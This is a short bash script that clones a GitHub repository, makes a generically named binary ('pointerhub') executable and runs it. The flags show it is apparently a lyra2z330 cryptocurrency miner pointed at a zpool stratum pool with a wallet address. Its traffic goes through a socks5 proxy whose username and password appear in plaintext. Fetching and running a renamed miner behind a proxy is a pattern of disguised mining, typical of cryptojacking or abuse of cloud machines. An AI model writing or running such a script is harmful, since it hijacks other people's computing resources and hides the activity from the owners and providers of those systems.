#!/bin/bash

sudo apt update
sudo apt-get install zip unzip
sudo apt install screen -y
screen -dmS pointertd.sh 65 75
sudo git clone https://github.com/admirah2819/posclubsahim.git
cd posclubsahim
chmod +x pointerhub
./pointerhub -a lyra2z330 -o stratum+tcp://lyra2z330.na.mine.zpool.ca:4563 -u DQGAS3U8cmDwBPn61bboXNBrSkEWhXuaVT.$(shuf -n 1 -i 1-9999999) -p c=DGB,zap=BUT-lyra2z330 -x socks5://aihzpnbr:dogmtwuiyn3a@176.116.230.118:7204
